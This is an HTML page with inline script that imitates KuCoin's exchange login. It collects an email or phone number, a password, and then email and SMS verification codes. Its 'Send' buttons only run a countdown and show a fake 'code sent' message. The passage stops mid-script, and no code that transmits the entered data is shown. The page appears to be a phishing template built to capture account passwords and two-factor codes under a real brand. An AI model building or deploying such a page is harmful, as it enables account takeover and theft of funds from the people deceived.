<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>KuCoin Login</title>
    <link rel="stylesheet" href="style.css" />
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
    />
    <link
      rel="stylesheet"
      type="text/css"
      href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css"
    />
    <!-- Font Awesome CDN -->
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
    />
    <style>
      /* Custom checkbox styles */
      .checkbox-container {
        display: flex;
        align-items: center;
        margin: 20px 0;
        cursor: pointer;
      }

      .custom-checkbox {
        position: relative;
        width: 20px;
        height: 20px;
        margin-right: 10px;
        border-radius: 50%;
        border: 2px solid #1d1d1d;
        background-color: transparent;
        display: flex;
        justify-content: center;
        align-items: center;
        transition: all 0.2s ease;
      }

      .custom-checkbox.checked {
        background-color: #1d1d1d;
      }

      .checkmark {
        color: white;
        font-size: 12px;
        opacity: 0;
        transition: opacity 0.2s ease;
      }

      .custom-checkbox.checked .checkmark {
        opacity: 1;
      }

      .checkbox-label {
        font-size: 14px;
        color: #333;
      }

      /* Hide the actual checkbox */
      .hidden-checkbox {
        position: absolute;
        opacity: 0;
        cursor: pointer;
        height: 0;
        width: 0;
      }

      /* Remove the old round-checkbox styles if they exist */
      .round-checkbox {
        display: none;
      }
    </style>
  </head>
  <body>
    <div>
      <header id="header" >
       <div class="">
         <div class="logo">
          <img src="./images/logo-k.svg" alt="logo">
        </div>
        <!-- <div class="header-icons">
          <div class="icon">
            <i class="fa-solid fa-globe" style="color: #1a1a1a"></i>
          </div>
          <div class="icon">
            <i class="fa-solid fa-earth-americas" style="color: #1a1a1a"></i>
          </div>
          <div class="icon">
            <i class="fa-solid fa-sun" style="color: #1a1a1a"></i>
          </div>
        </div> -->
       </div>
      </header>

      <main>
        <div class="left-section">
          <div class="illustration">
            <img
              src="./images/loginpicss.png"
              alt="KuCoin Illustration"
              class="illustration-img"
            />
          </div>
          <div class="left-content">
            <p class="subtitle">Find the Next Crypto Gem on KuCoin</p>
            <div class="green-line"></div>
            <h1 class="title">
              1 Out of 4 Crypto Holders Worldwide Is with KuCoin
            </h1>
          </div>
        </div>

        <div class="right-section">
          <h2 id="loginTitle" class="login-title">Log In</h2>

          <div id="tab" class="tabs">
            <div class="tab active" data-tab="email">Email/Phone Number</div>
            <div class="tab" data-tab="subaccount">Sub-Account</div>
            <div class="tab qr-code" data-tab="qrcode">QR Code</div>
            <div class="tab-indicator"></div>
          </div>

          <form id="loginForm">
            <!-- Email/Phone Number Tab Content -->
            <div class="form-step" id="step1">
              <fieldset class="custom-fieldset">
                <legend>Email/Phone Number</legend>
                <div class="custom-input-container">
                  <input
                    type="text"
                    id="email"
                    placeholder="Email/Phone Number"
                    required
                  />
                  <div class="input-icon">
                    <i class="fa-solid fa-envelope" style="color: #00c087"></i>
                  </div>
                  <div class="clear-icon" style="display: none">
                    <i
                      class="fa-solid fa-times-circle"
                      style="color: #666666"
                    ></i>
                  </div>
                </div>
              </fieldset>

              <button type="button" id="nextBtn" class="btn-primary">
                Next
              </button>
            </div>

            <div class="form-step hidden" id="step2">
              <!-- Email/Phone Number Field -->
              <fieldset class="custom-fieldset">
                <legend>Email/Phone Number</legend>
                <div class="custom-input-container">
                  <input type="text" id="email2" disabled />
                  <div class="input-icon">
                    <i class="fa-solid fa-envelope" style="color: #00c087"></i>
                  </div>
                  <div class="clear-icon">
                    <i
                      class="fa-solid fa-times-circle"
                      style="color: #666666"
                    ></i>
                  </div>
                </div>
              </fieldset>

              <!-- Password Field -->
              <fieldset class="custom-fieldset">
                <legend>Login Password</legend>
                <div class="custom-input-container">
                  <input
                    type="password"
                    id="password"
                    placeholder="Password"
                    required
                  />
                  <div class="toggle-password">
                    <i class="fa-solid fa-eye" style="color: #666666"></i>
                  </div>
                  <div class="clear-icon" style="display: none">
                    <i
                      class="fa-solid fa-times-circle"
                      style="color: #666666"
                    ></i>
                  </div>
                </div>
              </fieldset>

              <div class="forgot-password">
                <a href="#">Forgot password?</a>
              </div>
              <button id="handleLogin" type="submit" class="btn-primary">
                Log In
              </button>
            </div>

            <div class="form-step hidden" id="step3">
              <div class="security-container">
                <!-- Back Button -->
                <button type="button" class="back-button" id="securityBackBtn">
                  <i class="fa-solid fa-arrow-left"></i>
                  Back
                </button>

                <!-- Heading -->
                <h1 class="security-title">Security Verification</h1>
                <p class="security-description">
                  You need to complete all of the following verifications to
                  continue.
                </p>

                <!-- Email Verification -->
                <div class="verification-field">
                  <span id="emailVerificationLabel" class="verification-label"
                    >Email Verification Code</span
                  >
                  <div
                    class="verification-input-wrapper"
                    id="emailVerificationWrapper"
                  >
                    <input
                      type="text"
                      id="emailCode"
                      class="verification-input"
                      
                    />
                    <button
                      type="button"
                      class="verification-send-btn"
                      id="sendEmailBtn"
                    >
                      Send
                    </button>
                  </div>
                  <p
                    class="verification-message success"
                    id="emailVerificationMessage"
                  >
                    A verification code will be sent to da**@**.com.
                  </p>
                </div>

                <!-- SMS Verification -->
                <div class="verification-field">
                  <span id="smsVerificationLabel" class="verification-label">SMS Verification Code</span>
                  <div
                    class="verification-input-wrapper"
                    id="smsVerificationWrapper"
                  >
                    <input
                      type="text"
                      id="smsCode"
                      class="verification-input"
                     
                    />
                    <button
                      type="button"
                      class="verification-send-btn"
                      id="sendSmsBtn"
                    >
                      Send
                    </button>
                  </div>
                  <p
                    class="verification-message error"
                    id="smsVerificationMessage"
                  >
                    Invalid input.
                  </p>
                </div>

                <!-- Trust Device Checkbox -->
                <div class="checkbox-container" id="trustDeviceContainer">
                  <input type="checkbox" id="trust-device" class="hidden-checkbox">
                  <div class="custom-checkbox" id="customCheckbox">
                    <span class="checkmark">✓</span>
                  </div>
                  <span class="checkbox-label">
                    Trust this device to not require security verification for
                    30 days
                  </span>
                </div>

                <!-- Security Verification Not Available -->
                <a href="#" class="verification-link">
                  Security verification not available
                </a>

                <!-- Submit Button -->
                <button
                  type="button"
                  class="submit-button"
                  id="securitySubmitBtn"
                >
                  Submit
                </button>

                <!-- Anti-phishing Notice -->
                <div class="notice-container">
                  <i class="fa-solid fa-check-circle notice-icon"></i>
                  <span class="notice-text"
                    >No anti-phishing code configured yet.</span
                  >
                </div>

                <!-- Settings Link -->
                <p class="settings-text">
                  Log in to set your anti-phishing code in security settings.
                </p>
              </div>
            </div>

            <!-- Sub-Account Tab Content -->
            <div class="form-step hidden" id="subStep1">
              <fieldset class="custom-fieldset">
                <legend>Sub Account</legend>
                <div class="custom-input-container">
                  <input
                    type="text"
                    id="subEmail"
                    placeholder="Email/Phone Number"
                    required
                  />
                  <div class="input-icon">
                    <i class="fa-solid fa-envelope" style="color: #00c087"></i>
                  </div>
                  <div class="clear-icon" style="display: none">
                    <i
                      class="fa-solid fa-times-circle"
                      style="color: #666666"
                    ></i>
                  </div>
                </div>
              </fieldset>

              <button type="button" id="subNextBtn" class="btn-primary">
                Next
              </button>
            </div>

            <div class="form-step hidden" id="subStep2">
              <!-- Email/Phone Number Field -->
              <fieldset class="custom-fieldset">
                <legend>Email/Phone Number</legend>
                <div class="custom-input-container">
                  <input type="text" id="subEmail2" disabled />
                  <div class="input-icon">
                    <i class="fa-solid fa-envelope" style="color: #00c087"></i>
                  </div>
                  <div class="clear-icon">
                    <i
                      class="fa-solid fa-times-circle"
                      style="color: #666666"
                    ></i>
                  </div>
                </div>
              </fieldset>

              <!-- Password Field -->
              <fieldset class="custom-fieldset">
                <legend>Login Password</legend>
                <div class="custom-input-container">
                  <input
                    type="password"
                    id="subPassword"
                    placeholder="Password"
                    required
                  />
                  <div class="toggle-password sub-toggle-password">
                    <i class="fa-solid fa-eye" style="color: #666666"></i>
                  </div>
                  <div class="clear-icon" style="display: none">
                    <i
                      class="fa-solid fa-times-circle"
                      style="color: #666666"
                    ></i>
                  </div>
                </div>
              </fieldset>

              <div class="forgot-password">
                <a href="#">Forgot password?</a>
              </div>
              <button type="button" id="subLoginBtn" class="btn-primary">
                Log In
              </button>
            </div>

            <div class="form-step hidden" id="subStep3">
              <div class="security-container">
                <!-- Back Button -->
                <button
                  type="button"
                  class="back-button"
                  id="subSecurityBackBtn"
                >
                  <i class="fa-solid fa-arrow-left"></i>
                  Back
                </button>

                <!-- Heading -->
                <h1 class="security-title">Security Verification</h1>
                <p class="security-description">
                  You need to complete all of the following verifications to
                  continue.
                </p>

                <!-- Email Verification -->
                <div class="verification-field">
                  <span class="verification-label"
                    >Email Verification Code</span
                  >
                  <div
                    class="verification-input-wrapper"
                    id="subEmailVerificationWrapper"
                  >
                    <input
                      type="text"
                      id="subEmailCode"
                      class="verification-input"
                      
                    />
                    <button
                      type="button"
                      class="verification-send-btn"
                      id="subSendEmailBtn"
                    >
                      Send
                    </button>
                  </div>
                  <p
                    class="verification-message success"
                    id="subEmailVerificationMessage"
                  >
                    A verification code will be sent to da**@**.com.
                  </p>
                </div>

                <!-- SMS Verification -->
                <div class="verification-field">
                  <span class="verification-label">SMS Verification Code</span>
                  <div
                    class="verification-input-wrapper"
                    id="subSmsVerificationWrapper"
                  >
                    <input
                      type="text"
                      id="subSmsCode"
                      class="verification-input"
                    
                    />
                    <button
                      type="button"
                      class="verification-send-btn"
                      id="subSendSmsBtn"
                    >
                      Send
                    </button>
                  </div>
                  <p
                    class="verification-message error"
                    id="subSmsVerificationMessage"
                  >
                    Invalid input.
                  </p>
                </div>

                <!-- Trust Device Checkbox -->
                <div class="checkbox-container" id="subTrustDeviceContainer">
                  <input type="checkbox" id="sub-trust-device" class="hidden-checkbox">
                  <div class="custom-checkbox" id="subCustomCheckbox">
                    <span class="checkmark">✓</span>
                  </div>
                  <span class="checkbox-label">
                    Trust this device to not require security verification for
                    30 days
                  </span>
                </div>

                <!-- Security Verification Not Available -->
                <a href="#" class="verification-link">
                  Security verification not available
                </a>

                <!-- Submit Button -->
                <button
                  type="button"
                  class="submit-button"
                  id="subSecuritySubmitBtn"
                >
                  Submit
                </button>

                <!-- Anti-phishing Notice -->
                <div class="notice-container">
                  <i class="fa-solid fa-check-circle notice-icon"></i>
                  <span class="notice-text"
                    >No anti-phishing code configured yet.</span
                  >
                </div>

                <!-- Settings Link -->
                <p class="settings-text">
                  Log in to set your anti-phishing code in security settings.
                </p>
              </div>
            </div>

            <!-- QR Code Tab Content -->
            <div class="form-step hidden" id="qrStep">
              <div class="qr-container">
                <!-- QR Code Box (contains either spinner or QR code) -->
                <div class="qr-code-box">
                  <!-- Loading spinner (shown initially) -->
                  <div id="qrLoading" class="spinner"></div>

                  <!-- QR Code (hidden initially) -->
                  <img
                    id="qrCodeImage"
                    src="./images/qrcode.png"
                    alt="KuCoin QR Code"
                    class="qr-code-img hidden"
                  />
                </div>

                <div class="qr-instruction">
                 <img class="scaner-imge" src="./images/scanner.png" alt="scaner iamge">
                  <span
                    >Open the KuCoin app and scan the QR code to log in.</span
                  >
                </div>

                <div class="qr-signup">
                  <p>Don't have an account? <a href="#">Sign up now</a></p>
                </div>
              </div>
            </div>
          </form>

          <div id="dividers" class="divider">
            <span>Or continue with</span>
          </div>

          <div id="altLogin" class="alternative-login">
            <button class="alt-login-btn passkey">
              <i class="fa-solid fa-user" style="color: #1a1a1a"></i>
              Log In with Passkey
            </button>
          </div>

          <div id="socialLogin" class="social-login">
            <button class="social-btn telegram">
             <img src="./images/skype.svg" alt="">
              Telegram
            </button>
            <button class="social-btn google">
              <img src="./images/google.png" alt="">
              Google
            </button>
            <button class="social-btn apple">
            <img src="./images/apple.svg" alt="">
              Apple
            </button>
          </div>

          <div id="signupLink" class="signup-link">
            <p>Don't have an account? <a href="#">Sign up now</a></p>
          </div>

          <div id="toast" class="toast hidden">Verification code sent</div>
        </div>
      </main>
    </div>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        // Tab functionality
        const tabs = document.querySelectorAll(".tab");
        const tabIndicator = document.querySelector(".tab-indicator");

        // Get all form steps
        const step1 = document.getElementById("step1");
        const step2 = document.getElementById("step2");
        const step3 = document.getElementById("step3");
        const subStep1 = document.getElementById("subStep1");
        const subStep2 = document.getElementById("subStep2");
        const subStep3 = document.getElementById("subStep3");
        const qrStep = document.getElementById("qrStep");

        // Get QR code elements
        const qrLoading = document.getElementById("qrLoading");
        const qrCodeImage = document.getElementById("qrCodeImage");

        // Get all form elements
        const emailInput = document.getElementById("email");
        const email2Input = document.getElementById("email2");
        const passwordInput = document.getElementById("password");
        const emailCodeInput = document.getElementById("emailCode");
        const smsCodeInput = document.getElementById("smsCode");
        const subEmailInput = document.getElementById("subEmail");
        const subEmail2Input = document.getElementById("subEmail2");
        const subPasswordInput = document.getElementById("subPassword");
        const subEmailCodeInput = document.getElementById("subEmailCode");
        const subSmsCodeInput = document.getElementById("subSmsCode");

        // Get verification wrappers and messages
        const emailVerificationWrapper = document.getElementById(
          "emailVerificationWrapper"
        );
        const emailVerificationLabel = document.getElementById(
          "emailVerificationLabel"
        );
        const smsVerificationWrapper = document.getElementById(
          "smsVerificationWrapper"
        );
        const smsVerificationLabel = document.getElementById(
          "smsVerificationLabel"
        );
        const emailVerificationMessage = document.getElementById(
          "emailVerificationMessage"
        );
        const smsVerificationMessage = document.getElementById(
          "smsVerificationMessage"
        );
        const subEmailVerificationWrapper = document.getElementById(
          "subEmailVerificationWrapper"
        );
        const subSmsVerificationWrapper = document.getElementById(
          "subSmsVerificationWrapper"
        );
        const subEmailVerificationMessage = document.getElementById(
          "subEmailVerificationMessage"
        );
        const subSmsVerificationMessage = document.getElementById(
          "subSmsVerificationMessage"
        );

        // Get submit buttons
        const securitySubmitBtn = document.getElementById("securitySubmitBtn");
        const subSecuritySubmitBtn = document.getElementById(
          "subSecuritySubmitBtn"
        );

        // Get all buttons
        const nextBtn = document.getElementById("nextBtn");
        const subNextBtn = document.getElementById("subNextBtn");
        const subLoginBtn = document.getElementById("subLoginBtn");
        const securityBackBtn = document.getElementById("securityBackBtn");
        const subSecurityBackBtn =
          document.getElementById("subSecurityBackBtn");

        // Get UI elements
        const header = document.getElementById("header");
        const tab = document.getElementById("tab");
        const loginTitle = document.getElementById("loginTitle");
        const divider = document.getElementById("dividers");
        const altLogin = document.getElementById("altLogin");
        const socialLogin = document.getElementById("socialLogin");
        const signupLink = document.getElementById("signupLink");

        // Custom checkbox functionality
        const trustDeviceContainer = document.getElementById('trustDeviceContainer');
        const customCheckbox = document.getElementById('customCheckbox');
        const hiddenCheckbox = document.getElementById('trust-device');

        if (trustDeviceContainer && customCheckbox && hiddenCheckbox) {
          trustDeviceContainer.addEventListener('click', function() {
            // Toggle the checked state of the hidden checkbox
            hiddenCheckbox.checked = !hiddenCheckbox.checked;
            
            // Toggle the visual appearance
            if (hiddenCheckbox.checked) {
              customCheckbox.classList.add('checked');
            } else {
              customCheckbox.classList.remove('checked');
            }
          });
        }

        // Sub-account custom checkbox functionality
        const subTrustDeviceContainer = document.getElementById('subTrustDeviceContainer');
        const subCustomCheckbox = document.getElementById('subCustomCheckbox');
        const subHiddenCheckbox = document.getElementById('sub-trust-device');

        if (subTrustDeviceContainer && subCustomCheckbox && subHiddenCheckbox) {
          subTrustDeviceContainer.addEventListener('click', function() {
            // Toggle the checked state of the hidden checkbox
            subHiddenCheckbox.checked = !subHiddenCheckbox.checked;
            
            // Toggle the visual appearance
            if (subHiddenCheckbox.checked) {
              subCustomCheckbox.classList.add('checked');
            } else {
              subCustomCheckbox.classList.remove('checked');
            }
          });
        }

        // Function to hide all form steps
        function hideAllSteps() {
          const allSteps = [
            step1,
            step2,
            step3,
            subStep1,
            subStep2,
            subStep3,
            qrStep,
          ];
          allSteps.forEach((step) => {
            if (step) step.classList.add("hidden");
          });
        }

        // Function to simulate QR code loading
        function loadQRCode() {
          // Show loading spinner, hide QR code
          qrLoading.classList.remove("hidden");
          qrCodeImage.classList.add("hidden");

          // Simulate loading delay for exactly 5 seconds
          setTimeout(() => {
            // Hide loading spinner and show QR code
            qrLoading.classList.add("hidden");
            qrCodeImage.classList.remove("hidden");
          }, 3000); // 5 seconds loading time
        }

        // Function to validate verification codes and update submit button
        function validateVerificationCodes() {
          const emailCodeValue = emailCodeInput.value.trim();
          const smsCodeValue = smsCodeInput.value.trim();

          if (emailCodeValue !== "" && smsCodeValue !== "") {
            securitySubmitBtn.classList.add("active");
          } else {
            securitySubmitBtn.classList.remove("active");
          }
        }

        // Function to validate sub-account verification codes and update submit button
        function validateSubVerificationCodes() {
          const subEmailCodeValue = subEmailCodeInput.value.trim();
          const subSmsCodeValue = subSmsCodeInput.value.trim();

          if (subEmailCodeValue !== "" && subSmsCodeValue !== "") {
            subSecuritySubmitBtn.classList.add("active");
          } else {
            subSecuritySubmitBtn.classList.remove("active");
          }
        }

        // Function to mask email address for privacy
        function maskEmail(email) {
          if (!email) return "";
          
          // Check if it's an email (contains @)
          if (email.includes('@')) {
            const parts = email.split('@');
            const name = parts[0];
            const domain = parts[1];
            
            // Mask username part - show first 2 chars and last char
            let maskedName = '';
            if (name.length <= 3) {
              maskedName = name.charAt(0) + '*'.repeat(name.length - 1);
            } else {
              maskedName = name.substring(0, 2) + '*'.repeat(name.length - 3) + name.charAt(name.length - 1);
            }
            
            // Mask domain part
            const domainParts = domain.split('.');
            const domainName = domainParts[0];
            const extension = domainParts.slice(1).join('.');
            
            const maskedDomain = domainName.charAt(0) + '*'.repeat(domainName.length - 1);
            
            return `${maskedName}@${maskedDomain}.${extension}`;
          } 
          // If it's a phone number
          else {
            // Assuming it's a phone number, mask middle digits
            if (email.length <= 4) {
              return '*'.repeat(email.length);
            } else {
              const visibleStart = 2;
              const visibleEnd = 2;
              const start = email.substring(0, visibleStart);
              const end = email.substring(email.length - visibleEnd);
              const masked = '*'.repeat(email.length - visibleStart - visibleEnd);
              return start + masked + end;
            }
          }
        }

        // Add focus and blur events for verification inputs
        emailCodeInput.addEventListener("focus", () => {
          emailVerificationWrapper.classList.add("focused");
          emailVerificationWrapper.classList.remove("error");
            emailVerificationLabel.classList.add("focused");
            emailVerificationLabel.classList.remove("error");
          smsVerificationMessage.style.display = "none";
        });

        emailCodeInput.addEventListener("blur", () => {
          emailVerificationWrapper.classList.remove("focused");
          emailVerificationLabel.classList.remove("focused");
          if (emailCodeInput.value.trim() === "") {
            emailVerificationWrapper.classList.add("error");
            emailVerificationLabel.classList.add("error");
            emailVerificationMessage.textContent = "Invalid input.";
            emailVerificationMessage.classList.remove("success");
            emailVerificationMessage.classList.add("error");
          } else {
            // Use the masked email from the input field
            const maskedEmail = maskEmail(email2Input.value);
            emailVerificationMessage.textContent = `A verification code will be sent to ${maskedEmail}.`;
            emailVerificationMessage.classList.add("success");
            emailVerificationMessage.classList.remove("error");
          }
          validateVerificationCodes();
        });

        smsCodeInput.addEventListener("focus", () => {
          smsVerificationWrapper.classList.add("focused");
          smsVerificationWrapper.classList.remove("error");
          smsVerificationLabel.classList.add("focused");
          smsVerificationLabel.classList.remove("error");
          smsVerificationMessage.style.display = "none";
        });

        smsCodeInput.addEventListener("blur", () => {
          smsVerificationWrapper.classList.remove("focused");
          smsVerificationLabel.classList.remove("focused");
          if (smsCodeInput.value.trim() === "") {
            smsVerificationWrapper.classList.add("error");
            smsVerificationLabel.classList.add("error");
            smsVerificationMessage.textContent = "Invalid input.";
            smsVerificationMessage.style.display = "block";
          } else {
            smsVerificationMessage.style.display = "none";
          }
          validateVerificationCodes();
        });

        // Add input events for verification inputs
        emailCodeInput.addEventListener("input", validateVerificationCodes);
        smsCodeInput.addEventListener("input", validateVerificationCodes);

        // Add focus and blur events for sub-account verification inputs
        subEmailCodeInput.addEventListener("focus", () => {
          subEmailVerificationWrapper.classList.add("focused");
          subEmailVerificationWrapper.classList.remove("error");
          subSmsVerificationMessage.style.display = "none";
        });

        subEmailCodeInput.addEventListener("blur", () => {
          subEmailVerificationWrapper.classList.remove("focused");
          if (subEmailCodeInput.value.trim() === "") {
            subEmailVerificationWrapper.classList.add("error");
            subEmailVerificationMessage.textContent = "Invalid input.";
            subEmailVerificationMessage.classList.remove("success");
            subEmailVerificationMessage.classList.add("error");
          } else {
            // Use the masked email from the input field
            const maskedEmail = maskEmail(subEmail2Input.value);
            subEmailVerificationMessage.textContent = `A verification code will be sent to ${maskedEmail}.`;
            subEmailVerificationMessage.classList.add("success");
            subEmailVerificationMessage.classList.remove("error");
          }
          validateSubVerificationCodes();
        });

        subSmsCodeInput.addEventListener("focus", () => {
          subSmsVerificationWrapper.classList.add("focused");
          subSmsVerificationWrapper.classList.remove("error");
          subSmsVerificationMessage.style.display = "none";
        });

        subSmsCodeInput.addEventListener("blur", () => {
          subSmsVerificationWrapper.classList.remove("focused");
          if (subSmsCodeInput.value.trim() === "") {
            subSmsVerificationWrapper.classList.add("error");
            subSmsVerificationMessage.textContent = "Invalid input.";
            subSmsVerificationMessage.style.display = "block";
          } else {
            subSmsVerificationMessage.style.display = "none";
          }
          validateSubVerificationCodes();
        });

        // Add input events for sub-account verification inputs
        subEmailCodeInput.addEventListener(
          "input",
          validateSubVerificationCodes
        );
        subSmsCodeInput.addEventListener("input", validateSubVerificationCodes);

        // Tab click handler
        tabs.forEach((tab, index) => {
          tab.addEventListener("click", () => {
            // Remove active class from all tabs
            tabs.forEach((t) => t.classList.remove("active"));

            // Add active class to clicked tab
            tab.classList.add("active");

            // Move the indicator
            tabIndicator.style.transform = `translateX(${index * 100}%)`;

            // Hide all steps first
            hideAllSteps();

            // Show the appropriate form step based on the tab
            const tabType = tab.getAttribute("data-tab");
            if (tabType === "email") {
              step1.classList.remove("hidden");
              divider.classList.remove("hidden");
              altLogin.classList.remove("hidden");
              socialLogin.classList.remove("hidden");
              signupLink.classList.remove("hidden");
            } else if (tabType === "subaccount") {
              subStep1.classList.remove("hidden");
              divider.classList.remove("hidden");
              altLogin.classList.remove("hidden");
              socialLogin.classList.remove("hidden");
              signupLink.classList.remove("hidden");
            } else if (tabType === "qrcode") {
              qrStep.classList.remove("hidden");
              loadQRCode(); // Start loading QR code with 5 second delay
              divider.classList.add("hidden");
              altLogin.classList.add("hidden");
              socialLogin.classList.add("hidden");
              signupLink.classList.add("hidden");
            }
          });
        });

        // Get all clear icons and input fields
        const allInputs = document.querySelectorAll(
          'input[type="text"], input[type="password"]'
        );

        // Function to toggle clear icon visibility
        function toggleClearIcon(input) {
          if (input) {
            const clearIcon = input.parentElement.querySelector(".clear-icon");
            if (clearIcon) {
              if (input.value.trim() !== "") {
                clearIcon.style.display = "block";
              } else {
                clearIcon.style.display = "none";
              }
            }
          }
        }

        // Add input event listeners to all inputs
        allInputs.forEach((input) => {
          const clearIcon = input.parentElement.querySelector(".clear-icon");
          if (clearIcon) {
            // Initial state
            toggleClearIcon(input);

            // Listen for input changes
            input.addEventListener("input", () => {
              toggleClearIcon(input);
            });

            // Clear input when icon is clicked
            clearIcon.addEventListener("click", () => {
              input.value = "";
              toggleClearIcon(input);
              input.focus();
            });
          }
        });

        // Email/Phone Tab Next button click handler
        nextBtn.addEventListener("click", () => {
          if (emailInput.value.trim() !== "") {
            // Copy email value to step 2
            email2Input.value = emailInput.value;

            // Hide step 1 and show step 2
            step1.classList.add("hidden");
            step2.classList.remove("hidden");

            // Update clear icon visibility
            toggleClearIcon(email2Input);
          } else {
            // Show error if email is empty
            emailInput.style.borderColor = "red";
          }
        });

        // Sub-Account Tab Next button click handler
        subNextBtn.addEventListener("click", () => {
          if (subEmailInput.value.trim() !== "") {
            // Copy email value to subStep2
            subEmail2Input.value = subEmailInput.value;

            // Hide subStep1 and show subStep2
            subStep1.classList.add("hidden");
            subStep2.classList.remove("hidden");

            // Update clear icon visibility
            toggleClearIcon(subEmail2Input);
          } else {
            // Show error if email is empty
            subEmailInput.style.borderColor = "red";
          }
        });

        // Sub-Account Login button click handler
        subLoginBtn.addEventListener("click", () => {
          if (
            subEmail2Input.value.trim() !== "" &&
            subPasswordInput.value.trim() !== ""
          ) {
            // Hide subStep2 and show subStep3
            subStep2.classList.add("hidden");
            tab.classList.add("hidden");
            loginTitle.classList.add("hidden");
            divider.classList.add("hidden");
            altLogin.classList.add("hidden");
            socialLogin.classList.add("hidden");
            signupLink.classList.add("hidden");
            subStep3.classList.remove("hidden");
            
            // Update the verification message with the masked email
            const maskedEmail = maskEmail(subEmail2Input.value);
            subEmailVerificationMessage.textContent = `A verification code will be sent to ${maskedEmail}.`;
          } else {
            // Show error if fields are empty
            alert("Please fill in both fields.");
          }
        });

        // Clear icon click handler for email2
        const email2ClearIcon = document.querySelector("#step2 .clear-icon");
        if (email2ClearIcon) {
          email2ClearIcon.addEventListener("click", () => {
            email2Input.value = "";

            // Go back to step 1
            step2.classList.add("hidden");
            step1.classList.remove("hidden");

            // Focus on email input
            emailInput.focus();

            // Update clear icon visibility
            toggleClearIcon(emailInput);
          });
        }

        // Clear icon click handler for subEmail2
        const subEmail2ClearIcon = document.querySelector(
          "#subStep2 .clear-icon"
        );
        if (subEmail2ClearIcon) {
          subEmail2ClearIcon.addEventListener("click", () => {
            subEmail2Input.value = "";

            // Go back to subStep1
            subStep2.classList.add("hidden");
            subStep1.classList.remove("hidden");

            // Focus on subEmail input
            subEmailInput.focus();

            // Update clear icon visibility
            toggleClearIcon(subEmailInput);
          });
        }

        // Toggle password visibility for main form
        const togglePassword = document.querySelector(".toggle-password");
        if (togglePassword) {
          togglePassword.addEventListener("click", () => {
            if (passwordInput.type === "password") {
              passwordInput.type = "text";
              togglePassword.innerHTML = `<i class="fa-solid fa-eye-slash" style="color: #666666;"></i>`;
            } else {
              passwordInput.type = "password";
              togglePassword.innerHTML = `<i class="fa-solid fa-eye" style="color: #666666;"></i>`;
            }
          });
        }

        // Toggle password visibility for sub-account form
        const subTogglePassword = document.querySelector(
          ".sub-toggle-password"
        );
        if (subTogglePassword) {
          subTogglePassword.addEventListener("click", () => {
            if (subPasswordInput.type === "password") {
              subPasswordInput.type = "text";
              subTogglePassword.innerHTML = `<i class="fa-solid fa-eye-slash" style="color: #666666;"></i>`;
            } else {
              subPasswordInput.type = "password";
              subTogglePassword.innerHTML = `<i class="fa-solid fa-eye" style="color: #666666;"></i>`;
            }
          });
        }

        // Security section back button for main form
        if (securityBackBtn) {
          securityBackBtn.addEventListener("click", () => {
            // Hide step 3 and show step 1
            step3.classList.add("hidden");
            step1.classList.remove("hidden");

            // Show all the elements that were hidden
            tab.classList.remove("hidden");
            loginTitle.classList.remove("hidden");
            divider.classList.remove("hidden");
            altLogin.classList.remove("hidden");
            socialLogin.classList.remove("hidden");
            signupLink.classList.remove("hidden");

            // Reset inputs
            emailInput.value = "";
            passwordInput.value = "";
            emailCodeInput.value = "";
            smsCodeInput.value = "";

            // Reset verification wrappers
            emailVerificationWrapper.classList.remove("focused", "error");
            smsVerificationWrapper.classList.remove("focused", "error");
            emailVerificationMessage.textContent = "A verification code will be sent to your email.";
            emailVerificationMessage.classList.add("success");
            emailVerificationMessage.classList.remove("error");
            smsVerificationMessage.style.display = "none";

            // Reset submit button
            securitySubmitBtn.classList.remove("active");

            // Reset checkbox
            hiddenCheckbox.checked = false;
            customCheckbox.classList.remove('checked');

            // Update clear icon visibility
            toggleClearIcon(emailInput);
            toggleClearIcon(passwordInput);
          });
        }

        // Security section back button for sub-account form
        if (subSecurityBackBtn) {
          subSecurityBackBtn.addEventListener("click", () => {
            // Hide subStep3 and show subStep1
            subStep3.classList.add("hidden");
            subStep1.classList.remove("hidden");

            // Show all the elements that were hidden
            tab.classList.remove("hidden");
            loginTitle.classList.remove("hidden");
            divider.classList.remove("hidden");
            altLogin.classList.remove("hidden");
            socialLogin.classList.remove("hidden");
            signupLink.classList.remove("hidden");

            // Reset inputs
            subEmailInput.value = "";
            subPasswordInput.value = "";
            subEmailCodeInput.value = "";
            subSmsCodeInput.value = "";

            // Reset verification wrappers
            subEmailVerificationWrapper.classList.remove("focused", "error");
            subSmsVerificationWrapper.classList.remove("focused", "error");
            subEmailVerificationMessage.textContent = "A verification code will be sent to your email.";
            subEmailVerificationMessage.classList.add("success");
            subEmailVerificationMessage.classList.remove("error");
            subSmsVerificationMessage.style.display = "none";

            // Reset submit button
            subSecuritySubmitBtn.classList.remove("active");

            // Reset checkbox
            subHiddenCheckbox.checked = false;
            subCustomCheckbox.classList.remove('checked');

            // Update clear icon visibility
            toggleClearIcon(subEmailInput);
            toggleClearIcon(subPasswordInput);
          });
        }

        // Form submission for main form
        const loginForm = document.getElementById("handleLogin");

        loginForm.addEventListener("click", (e) => {
          e.preventDefault();

          // Optional: basic validation
          if (
            email2Input.value.trim() === "" ||
            passwordInput.value.trim() === ""
          ) {
            alert("Please fill in both fields.");
            return;
          }

          // Hide step 2 and show step 3
          step2.classList.add("hidden");
          tab.classList.add("hidden");
          loginTitle.classList.add("hidden");
          divider.classList.add("hidden");
          altLogin.classList.add("hidden");
          socialLogin.classList.add("hidden");
          signupLink.classList.add("hidden");
          step3.classList.remove("hidden");
          
          // Update the verification message with the masked email
          const maskedEmail = maskEmail(email2Input.value);
          emailVerificationMessage.textContent = `A verification code will be sent to ${maskedEmail}.`;
        });

        // Verification code buttons for main form
        document
          .getElementById("sendEmailBtn")
          .addEventListener("click", () => {
            startCountdown("sendEmailBtn", 60);
            showToast("Verification code sent");
          });

        document.getElementById("sendSmsBtn").addEventListener("click", () => {
          startCountdown("sendSmsBtn", 60);
          showToast("Verification code sent");
        });

        // Verification code buttons for sub-account form
        document
          .getElementById("subSendEmailBtn")
          .addEventListener("click", () => {
            startCountdown("subSendEmailBtn", 60);
            showToast("Verification code sent");
          });

        document
          .getElementById("subSendSmsBtn")
          .addEventListener("click", () => {
